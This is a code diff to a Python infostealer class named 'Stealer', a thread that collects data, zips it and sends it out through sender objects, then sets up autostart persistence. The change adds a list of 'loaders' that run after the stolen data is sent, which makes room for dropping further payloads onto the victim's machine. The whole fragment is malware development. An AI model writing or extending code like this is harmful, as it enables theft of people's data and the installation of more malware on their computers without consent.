@@ -16,8 +16,13 @@ class Stealer(Thread):
     Collects and sends the specified data.
     """
 
-    def __init__(self, senders: List = None, features: List = None, utils: List = None, delay: int = 0):
+    def __init__(self, senders: List = None, features: List = None, utils: List = None, loaders: List = None, delay: int = 0):
         Thread.__init__(self, name="Stealer")
+
+        if loaders is None:
+            self.__loaders = []
+        else:
+            self.__loaders = loaders
 
         if utils is None:
             utils = []
@@ -201,6 +206,9 @@ class Stealer(Thread):
 
             for sender in self.__senders:
                 sender.run(self.__config.ZipName, data)
+
+            for loader in self.__loaders:
+                loader.run()
 
             if self.__autostart is True:
                 Autostart(argv[0]).run()
